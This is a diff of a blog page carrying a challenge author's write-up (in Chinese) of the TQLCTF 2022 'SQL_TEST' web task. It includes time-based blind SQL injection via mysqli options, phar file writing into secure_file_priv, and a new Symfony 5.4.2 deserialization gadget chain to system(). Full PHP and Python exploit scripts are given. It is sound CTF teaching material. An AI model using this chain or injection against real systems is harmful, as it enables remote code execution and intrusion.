@@ -6,16 +6,28 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://igml.top">
-  <title>Tag: Web | gml&#39;s blog</title>
+  <title>TQLCTF-SQL_TEST出题笔记 | gml&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="gml&#39;s blog">
-<meta property="og:url" content="https://igml.top/tags/Web/page/3/index.html">
+  <meta name="description" content="本次TQLCTF算是Redbud第一次参与全国赛的命题和组织（也大概率是我最后一次参与，文末有退役老选手的小作文hhh），所以想给大家出一道有趣新颖的题目。一直没什么idea，所以想着找个框架挖一挖链子算了，但是可能比较俗，所以结合了mysql写文件，并加了一个独特的phar反序列化触发点。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="TQLCTF-SQL_TEST出题笔记">
+<meta property="og:url" content="https://igml.top/2022/02/20/TQLCTF2022/index.html">
 <meta property="og:site_name" content="gml&#39;s blog">
+<meta property="og:description" content="本次TQLCTF算是Redbud第一次参与全国赛的命题和组织（也大概率是我最后一次参与，文末有退役老选手的小作文hhh），所以想给大家出一道有趣新颖的题目。一直没什么idea，所以想着找个框架挖一挖链子算了，但是可能比较俗，所以结合了mysql写文件，并加了一个独特的phar反序列化触发点。">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://igml.top/2022/02/20/TQLCTF2022/image-20220220170538668.png">
+<meta property="og:image" content="https://igml.top/2022/02/20/TQLCTF2022/image-20220220170632680.png">
+<meta property="og:image" content="https://igml.top/2022/02/20/TQLCTF2022/image-20220220170844516.png">
+<meta property="og:image" content="https://igml.top/2022/02/20/TQLCTF2022/image-20220220171123191.png">
+<meta property="og:image" content="https://igml.top/2022/02/20/TQLCTF2022/image-20220220171142745.png">
+<meta property="article:published_time" content="2022-02-20T08:37:20.000Z">
+<meta property="article:modified_time" content="2022-02-20T12:53:38.781Z">
 <meta property="article:author" content="gml-sec">
-<meta property="article:tag" content="gml-sec,博客">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="wp">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://igml.top/2022/02/20/TQLCTF2022/image-20220220170538668.png">
   
     <link rel="alternative" href="/atom.xml" title="gml&#39;s blog" type="application/atom+xml">
   
@@ -156,36 +168,118 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-TQLCTF2022" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2018" class="archive-year">2018</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2018/11/05/2018-XCTF-FINALS/" class="archive-article-date">
-  	<time datetime="2018-11-05T11:25:07.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-05</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2018/11/05/2018-XCTF-FINALS/">2018 XCTF FINALS</a>
+    <h1 class="article-title" itemprop="name">
+      TQLCTF-SQL_TEST出题笔记
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
+        
+        <a href="/2022/02/20/TQLCTF2022/" class="archive-article-date">
+  	<time datetime="2022-02-20T08:37:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-02-20</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>本次TQLCTF算是Redbud第一次参与全国赛的命题和组织（也大概率是我最后一次参与，文末有退役老选手的小作文hhh），所以想给大家出一道有趣新颖的题目。一直没什么idea，所以想着找个框架挖一挖链子算了，但是可能比较俗，所以结合了mysql写文件，并加了一个独特的phar反序列化触发点。</p>
+<a id="more"></a>
+
+<h2 id="出题思路"><a href="#出题思路" class="headerlink" title="出题思路"></a>出题思路</h2><p>选框架挖链子花了挺长时间，一些常见框架比如laravel、thinkphp等被挖烂了，最后发现Symfony5新版本似乎没啥链子，但是本人没有挖掘出最新版本RCE的链子，选了5.4.2版本挖了条链子。（测试中发现直接拿phpggc中Monolog的链子就能打，就把Monolog的依赖给删了）</p>
+<p>众所周知mysql读写文件只能secure_file_path目录下进行，那如果这个目录不是常见路径就意味着无法写文件了么？显然不是，如果我们有注入之类的可以通过注入获取到这个目录，这道题目就是加了这个考点。</p>
+<p>关于phar反序列化的触发点，参考了zsx这篇<a target="_blank" rel="noopener" href="https://blog.zsxsoft.com/post/38">https://blog.zsxsoft.com/post/38</a>，去翻了下php关于mysql相关源码，在<code>ext/mysqlnd/mysqlnd_auth.c</code>下有关caching_sha2_password认证的操作里找到了对<code>php_stream_open_wrapper</code>的调用。</p>
+<p>将以上这三点结合起来，最终出了这道题，以下是完整题解。</p>
+<h2 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h2><p>题目给了源码，是基于Symfony框架开发，版本是5.4.2。审计源码发现只有一个TestController：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">App</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Bundle</span>\<span class="title">FrameworkBundle</span>\<span class="title">Controller</span>\<span class="title">AbstractController</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Response</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Routing</span>\<span class="title">Annotation</span>\<span class="title">Route</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">HttpFoundation</span>\<span class="title">Request</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestController</span> <span class="keyword">extends</span> <span class="title">AbstractController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@Route</span>(&quot;/test&quot;, name=&quot;test&quot;)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params">Request $request</span>): <span class="title">Response</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $con = mysqli_init();</span><br><span class="line">        $key = $request-&gt;query-&gt;get(<span class="string">&#x27;key&#x27;</span>);</span><br><span class="line">        $value = $request-&gt;query-&gt;get(<span class="string">&#x27;value&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_numeric($key) &amp;&amp; is_string($value)) &#123;</span><br><span class="line">            mysqli_options($con, $key, $value);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        mysqli_options($con, MYSQLI_OPT_LOCAL_INFILE, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (!mysqli_real_connect($con, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;ctf&quot;</span>, <span class="string">&quot;gmlsec123456&quot;</span>, <span class="string">&quot;mysql&quot;</span>)) &#123;</span><br><span class="line">            $content = <span class="string">&#x27;数据库连接失败&#x27;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $content = <span class="string">&#x27;数据库连接成功&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mysqli_close($con);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Response(</span><br><span class="line">            $content,</span><br><span class="line">            Response::HTTP_OK,</span><br><span class="line">            [<span class="string">&#x27;content-type&#x27;</span> =&gt; <span class="string">&#x27;text/html&#x27;</span>]</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以控制一个mysqli_options 的选项，然后连接本地数据库。</p>
+<h3 id="执行任意SQL语句"><a href="#执行任意SQL语句" class="headerlink" title="执行任意SQL语句"></a>执行任意SQL语句</h3><p>查阅mysqli_options 函数的相关文档：</p>
+<p><img src="/2022/02/20/TQLCTF2022/image-20220220170538668.png" alt="image-20220220170538668"></p>
+<p>很明显发现可以设置建立 MySQL 连接之后要执行的 SQL 语句。</p>
+<p>php 7的环境下打印下<code>MYSQLI_INIT_COMMAND</code>的值：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">~  php -a</span><br><span class="line">Interactive shell</span><br><span class="line"></span><br><span class="line">php &gt; <span class="built_in">echo</span> MYSQLI_INIT_COMMAND;</span><br><span class="line">3</span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure>
+
+<p>尝试 <code>/index.php/test?key=3&amp;value=select%20sleep(3)</code>，延时成功。因为没有回显，可以采用时间盲注的方式获取数据。（经测试，<code>select if(1,(select exp(1000)),0)</code>这种通过是否报错进行布尔盲注的方式不可以）</p>
+<p>显然flag肯定不在数据库里（可以通过时间盲注获取数据也会发现没有任何新创建的数据库和表）。现在我们可以执行一条mysql的命令，尝试堆叠发现无果，create database、insert、update数据失败，load_file读取/etc/passwd也是失败。这时猜想是否题目设置了 <code>secure_file_priv</code>， 尝试获取<code>secure_file_priv</code>目录。</p>
+<p>平时我们经常使用的方式是 <code>show global variables like &#39;%secure_file_priv%&#39;</code>，现在没有回显，我们需要时间盲注的方式获取。我们还可以通过<code>select @@global.secure_file_priv</code>进行获取并进行盲注：</p>
+<p><img src="/2022/02/20/TQLCTF2022/image-20220220170632680.png" alt="image-20220220170632680"></p>
+<p>可以通过时间盲注得到目录：<code>/tmp/53ca05a8a6854dc2cdceeeaf52671f27</code>（这个目录在实际比赛中是动态的）</p>
+<p>这个目录明显是故意设置，所以肯定这里是利用点。我们不知道这个目录下有什么文件，但是我们可以向这个目录任意写文件。Symfony 5.4.2 的版本并没有什么漏洞，所以通过文件包含getshell不太可能，我们可以自然想到可以通过写入phar文件，触发反序列化getshell。</p>
+<p>要通过phar触发反序列化进行getshell，要有POP链和触发点。首先关注POP链，phpggc上最新的链子是 5.2 版本的，经过分析无法成功利用。将源码与 Symfony 5.4.2 的源码对比，发现去除了 Monolog 的依赖，Monolog的链子也利用不了，需要挖掘一条新的POP链。</p>
+<h3 id="挖掘POP链"><a href="#挖掘POP链" class="headerlink" title="挖掘POP链"></a>挖掘POP链</h3><p>寻找__destruct方法，因为有一些类都存在 __wakeup方法，所以剩下的也不多。剩下的类 __destruct方法调用也很乱，所以尝试搜索 __call 方法，看看有什么可以利用的。在vendor/symfony/cache/Traits/RedisProxy.php 定义的<code>RedisProxy</code>类存在__call方法：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="keyword">string</span> $method, <span class="keyword">array</span> $args</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;ready ?: <span class="keyword">$this</span>-&gt;ready = <span class="keyword">$this</span>-&gt;initializer-&gt;__invoke(<span class="keyword">$this</span>-&gt;redis);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;redis-&gt;&#123;$method&#125;(...$args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以调用任意类的 __invoke 方法，并且参数可控。寻找可利用的 __invoke，在vendor/doctrine/doctrine-bundle/Dbal/SchemaAssetsFilterManager.php定义的<code>SchemaAssetsFilterManager</code>类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** <span class="doctag">@param</span> string|AbstractAsset $assetName */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params">$assetName</span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="keyword">$this</span>-&gt;schemaAssetFilters <span class="keyword">as</span> $schemaAssetFilter) &#123;</span><br><span class="line">        <span class="keyword">if</span> ($schemaAssetFilter($assetName) === <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以发现明显的动态函数调用，并且函数名和参数都可控。与之类似的vendor/symfony/console/Helper/Dumper.php 定义的<code>Dumper</code>类，这个更直接一些：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params">$var</span>): <span class="title">string</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;handler)($var);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以现在我们只需在 __destruct 中找到任意一个可控变量对任意函数的调用即可，类似<code>$xxxx-&gt;xxxx()</code>，这应该不难寻找，在vendor/doctrine/cache/lib/Doctrine/Common/Cache/Psr6/CacheAdapter.php中定义的<code>CacheAdapter</code>类：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;commit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跟进：</p>
+<p><img src="/2022/02/20/TQLCTF2022/image-20220220170844516.png" alt="image-20220220170844516"></p>
+<p>至此，getshell 的POP链已经完成。exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//namespace Doctrine\Bundle\DoctrineBundle\Dbal &#123;</span></span><br><span class="line"><span class="comment">//    class SchemaAssetsFilterManager</span></span><br><span class="line"><span class="comment">//    &#123;</span></span><br><span class="line"><span class="comment">//        private $schemaAssetFilters;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//        public function __construct()</span></span><br><span class="line"><span class="comment">//        &#123;</span></span><br><span class="line"><span class="comment">//            $this-&gt;schemaAssetFilters = array(&#x27;system&#x27;);</span></span><br><span class="line"><span class="comment">//        &#125;</span></span><br><span class="line"><span class="comment">//    &#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Console</span>\<span class="title">Helper</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Dumper</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">handler</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;handler = <span class="string">&#x27;system&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Symfony</span>\<span class="title">Component</span>\<span class="title">Cache</span>\<span class="title">Traits</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">RedisProxy</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">redis</span>;</span><br><span class="line">        <span class="keyword">private</span> $initializer;</span><br><span class="line">        <span class="keyword">private</span> $ready = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redis = <span class="string">&#x27;id&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;initializer = <span class="keyword">new</span> \Symfony\Component\Console\Helper\Dumper();</span><br><span class="line"><span class="comment">//            $this-&gt;initializer = new \Doctrine\Bundle\DoctrineBundle\Dbal\SchemaAssetsFilterManager();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">Cache</span>\<span class="title">Psr6</span> &#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">CacheAdapter</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title">private</span> $<span class="title">deferredItems</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;deferredItems = <span class="keyword">array</span>(<span class="keyword">new</span> \Symfony\Component\Cache\Traits\RedisProxy());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    $<span class="title">a</span> = <span class="title">new</span> <span class="title">Doctrine</span>\<span class="title">Common</span>\<span class="title">Cache</span>\<span class="title">Psr6</span>\<span class="title">CacheAdapter</span>();</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">&#x27;test.phar&#x27;</span>);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span> . <span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line">    $phar-&gt;addFromString(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">    $phar-&gt;setMetadata($a);</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本地测试该POP链可用。</p>
+<h3 id="寻找触发点"><a href="#寻找触发点" class="headerlink" title="寻找触发点"></a>寻找触发点</h3><p>现在只剩触发点，我们可控的就只有一对key和value，查看其他可以设置的选项，发现<code>MYSQLI_SERVER_PUBLIC_KEY</code>这个选项涉及文件操作，这个选项指定SHA-256 认证模式下，要使用的 RSA 公钥文件。</p>
+<p>mysql8.0 之前的版本中默认的身份验证方式是mysql_native_password, 而在mysql8.0之后变为了<code>caching_sha2_password</code>。相信很多人在用php连接mysql8的时候都会出现错误情况，去搜基本都是由于默认的身份验证方式改变了。caching_sha2_password实现了SHA-256 认证，并且在服务器端使用缓存以获得更好的性能。官方文档：<a target="_blank" rel="noopener" href="https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html">https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html</a></p>
+<p>查阅文档可以发现，客户端有两种方式指定服务端的公钥：一种是从服务端请求公钥，然后服务端将公钥发松给客户端；另外一种是客户端本地指定服务端公钥的路径：</p>
+<p><img src="/2022/02/20/TQLCTF2022/image-20220220171123191.png" alt="image-20220220171123191"></p>
+<p>上面提到的<code>MYSQLI_SERVER_PUBLIC_KEY</code>选项便是指定服务端公钥的路径。</p>
+<p>那么既然这里存在读取文件的可能，是否可以触发phar反序列化呢？查阅PHP源码，在ext/mysqlnd/mysqlnd_auth.c 中可以找到<code>mysqlnd_caching_sha2_get_key</code>函数的实现：</p>
+<p><img src="/2022/02/20/TQLCTF2022/image-20220220171142745.png" alt="image-20220220171142745"></p>
+<p>可以看到，调用了php_stream_open_wrapper，因此可以来触发phar反序列化。</p>
+<p>现在过程很明确：可以生成phar文件，通过mysql写入目录，再通过<code>MYSQLI_SERVER_PUBLIC_KEY</code>触发反序列化执行命令。</p>
+<p>但是经过尝试发现最终触发失败，回显依然是数据库连接成功。这是因为caching_sha2_password认证方式下服务器端会使用缓存，如果不指定公钥连接就是向服务器请求key，所以一旦请求一次成功连接会保留着缓存，导致不会去加载我们指定的公钥。</p>
+<p>查阅资料发现缓存存储在内存中：<a target="_blank" rel="noopener" href="https://dba.stackexchange.com/questions/218190/where-is-the-cache-for-the-mysql-caching-sha2-password-auth-plugin-stored">https://dba.stackexchange.com/questions/218190/where-is-the-cache-for-the-mysql-caching-sha2-password-auth-plugin-stored</a>, <code>FLUSH PRIVILEGES</code>即可。这里0ops战队的解法也比较巧妙，通过修改用户密码，导致连接失败，同样会触发加载公钥的操作。</p>
+<p>最终exp：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import requests, <span class="keyword">string</span>, random, os, time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:7001&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def req(key, value):</span><br><span class="line">    resp = requests.get(url + <span class="string">&quot;/index.php/test&quot;</span>, params=&#123;<span class="string">&#x27;key&#x27;</span>: key, <span class="string">&#x27;value&#x27;</span>: value&#125;)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_secure_file_priv():</span><br><span class="line">    char_list = <span class="string">&quot;_/&quot;</span> + <span class="keyword">string</span>.ascii_letters + <span class="keyword">string</span>.digits</span><br><span class="line">    template = <span class="string">&quot;select if((select substr(@@global.secure_file_priv,%s,1)=&#x27;%s&#x27;),sleep(2),1)&quot;</span></span><br><span class="line">    data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">        flag = <span class="literal">False</span></span><br><span class="line">        <span class="keyword">for</span> c in char_list:</span><br><span class="line">            resp = req(<span class="string">&#x27;3&#x27;</span>, template % (i, c))</span><br><span class="line">            <span class="keyword">if</span> resp.elapsed.seconds &gt; <span class="number">1.5</span>:</span><br><span class="line">                data += c</span><br><span class="line">                flag = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">print</span>(data)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> not flag:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;end!&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp(secure_file_path):</span><br><span class="line">    filename = <span class="string">&quot;&quot;</span>.join(random.sample(<span class="keyword">string</span>.ascii_letters, <span class="number">6</span>)) + <span class="string">&#x27;.phar&#x27;</span></span><br><span class="line">    file = os.path.join(secure_file_path, filename)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># write phar file</span></span><br><span class="line">    hex_data = open(<span class="string">&quot;test.phar&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().hex()</span><br><span class="line">    command = <span class="string">&quot;select 0x&#123;&#125; into dumpfile &#x27;&#123;&#125;&#x27;&quot;</span>.format(hex_data, file)</span><br><span class="line">    req(<span class="string">&#x27;3&#x27;</span>, command)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># check file exists</span></span><br><span class="line">    command = <span class="string">&quot;select if((ISNULL(load_file(&#x27;&#123;&#125;&#x27;))),sleep(2),1)&quot;</span>.format(file)</span><br><span class="line">    <span class="keyword">if</span> req(<span class="string">&#x27;3&#x27;</span>, command).elapsed.seconds &gt; <span class="number">1.5</span>:</span><br><span class="line">        <span class="keyword">print</span>(<span class="string">&quot;file write fail!&quot;</span>)</span><br><span class="line">        <span class="keyword">exit</span>()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># clean the cache</span></span><br><span class="line">    req(<span class="string">&#x27;3&#x27;</span>,<span class="string">&quot;FLUSH PRIVILEGES&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># trigger unserialize</span></span><br><span class="line">    resp = req(<span class="string">&#x27;35&#x27;</span>, <span class="string">&#x27;phar://&#x27;</span> + file)</span><br><span class="line">    <span class="keyword">print</span>(resp.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    secure_file_path = get_secure_file_priv()</span><br><span class="line">    <span class="comment"># secure_file_path = &#x27;/tmp/1ba652f29a29b74c5c7abb1abf6ba36e/&#x27;</span></span><br><span class="line">    exp(secure_file_path)</span><br></pre></td></tr></table></figure>
+
